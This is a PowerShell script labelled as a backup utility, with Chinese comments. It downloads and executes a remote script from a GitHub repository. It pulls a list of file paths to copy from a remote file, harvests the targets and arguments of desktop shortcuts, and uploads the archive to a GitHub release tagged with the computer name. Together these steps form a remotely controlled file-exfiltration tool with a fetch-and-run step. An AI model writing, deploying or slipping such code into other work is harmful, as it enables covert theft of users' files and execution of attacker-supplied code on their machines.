# -- 基本设置 --
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$repo = "rtyuiuiop/1"
$token = $env:GITHUB_TOKEN
if (-not $token) {
    Write-Error " ❌ 环境变量 GITHUB_TOKEN 未设置，无法继续上传。"
    exit 1
}
$tag = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$apiUrl = "https://api.github.com/repos/$repo/releases"
$pathListUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"
$remoteUploadUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/remote-upload.ps1"
$remoteEntrypoint = "Invoke-RemoteUpload"  # 远程脚本约定的入口函数名

# -- 尝试加载远程上传脚本 --
$remoteScriptTemp = Join-Path $env:TEMP "remote-upload.ps1"
$remoteAvailable = $false
$remoteUploaded = $false

try {
    Invoke-WebRequest -Uri $remoteUploadUrl -OutFile $remoteScriptTemp -ErrorAction Stop
    if (Test-Path $remoteScriptTemp) {
        . $remoteScriptTemp
        if (Get-Command -Name $remoteEntrypoint -ErrorAction SilentlyContinue) {
            Write-Host "✅ 已加载远程上传脚本，入口函数：$remoteEntrypoint"
            $remoteAvailable = $true
        } else {
            Write-Warning "⚠️ 远程脚本已下载，但未发现入口函数 $remoteEntrypoint，将回退使用本地上传。"
        }
    }
} catch {
    Write-Warning "⚠️ 无法加载远程上传脚本：$($_.Exception.Message)"
}

# -- 获取要备份的路径列表 --
try {
    $raw = Invoke-WebRequest -Uri $pathListUrl -ErrorAction Stop
    $paths = ($raw.Content -split "`r?`n") | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    if (-not $paths -or $paths.Count -eq 0) { throw "空的路径列表" }
    Write-Host "✅ 成功获取路径列表："
    $paths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Warning "❌ 无法获取路径配置文件：$($_.Exception.Message)"
    exit 1
}

$workDir = Join-Path $env:TEMP ("backup_$tag")
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# -- ⬇️ 拷贝文件（鲁棒性优化） --
foreach ($path in $paths) {
    if (-not (Test-Path $path)) {
        Write-Warning "❌ 路径不存在：$path"
        continue
    }
    try {
        $relative = $path -replace "^[A-Za-z]:\\", "" -replace "[:\\]", "_"
        $dest = Join-Path $workDir $relative
        New-Item -ItemType Directory -Path (Split-Path $dest) -Force | Out-Null
        Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction Stop
    } catch {
        Write-Warning "⚠️ 无法复制：$path — $_"
    }
}

# -- ⬇️ 提取桌面快捷方式信息（含参数） --
try {
    $shell = New-Object -ComObject WScript.Shell
    $desktopDirs = @(
        "$env:USERPROFILE\Desktop",
        "$env:PUBLIC\Desktop"
    )
    $lnkInfo = ""

    foreach ($dir in $desktopDirs) {
        if (-not (Test-Path $dir)) { continue }
        Get-ChildItem -Path $dir -Filter *.lnk -Force -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $shortcut = $shell.CreateShortcut($_.FullName)
                $fullCmd = "`"$($shortcut.TargetPath)`" $($shortcut.Arguments)"
                $lnkInfo += "$($_.Name)`n$fullCmd`n`n"
            } catch {
                $lnkInfo += "$($_.Name)`n[Failed to parse]`n`n"
            }
        }
    }

    if ($lnkInfo) {
        $lnkOutputFile = Join-Path $workDir "lnk_full_paths.txt"
        $lnkInfo | Out-File -FilePath $lnkOutputFile -Encoding UTF8
        Write-Host "🧷 已生成桌面快捷方式路径 lnk_full_paths.txt"
    } else {
        Write-Host "ℹ️ 未找到可解析的桌面快捷方式。"
    }
} catch {
    Write-Warning "⚠️ 快捷方式路径提取失败：$($_.Exception.Message)"
}

# -- ⬇️ 打包 --
$zipPath = Join-Path $env:TEMP ("$tag.zip")
try {
    Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force -ErrorAction Stop
} catch {
    Write-Warning "❌ 打包失败：$($_.Exception.Message)"
    Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
    exit 1
}

# -- 远程上传（优先） --
if ($remoteAvailable -and (Get-Command -Name $remoteEntrypoint -ErrorAction SilentlyContinue)) {
    try {
        # 传入常用参数，若远程脚本定义不同，需调整参数名
        & $remoteEntrypoint -ZipPath $zipPath -Tag $tag -Repo $repo -Token $token -ApiUrl $apiUrl
        $remoteUploaded = $true
        Write-Host "✅ 远程上传入口执行完成。"
    } catch {
        Write-Warning "⚠️ 远程上传执行失败：$($_.Exception.Message)"
        $remoteUploaded = $false
    }
}

# -- 如果未通过远程上传，则使用本地上传实现 --
if (-not $remoteUploaded) {
    $releaseBody = @{
        tag_name   = $tag
        name       = "Backup - $tag"
        body       = "Automated backup on $tag"
        draft      = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3

    $headers = @{
        Authorization = "token $token"
        "User-Agent"  = "PowerShellScript"
        Accept        = "application/vnd.github.v3+json"
        "Content-Type" = "application/json"
    }

    try {
        $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $releaseBody -ErrorAction Stop
        if (-not $response) { throw "没有返回 Release 信息" }
        $uploadUrl = $response.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"
    } catch {
        Write-Warning "❌ 创建 Release 失败：$($_.Exception.Message)"
        Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
        exit 1
    }

    try {
        $uploadHeaders = @{
            Authorization = "token $token"
            "Content-Type" = "application/zip"
            "User-Agent" = "PowerShellScript"
        }
        Invoke-WebRequest -Uri $uploadUrl -Method POST -Headers $uploadHeaders -InFile $zipPath -ContentType "application/zip" -ErrorAction Stop
        Write-Host "`n✅ 上传成功：$tag.zip"
    } catch {
        Write-Warning "❌ 上传过程出错：$($_.Exception.Message)"
    }
}

# -- 清理 --
try {
    Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
} catch {
    Write-Warning "⚠️ 清理临时文件时出错：$($_.Exception.Message)"
}
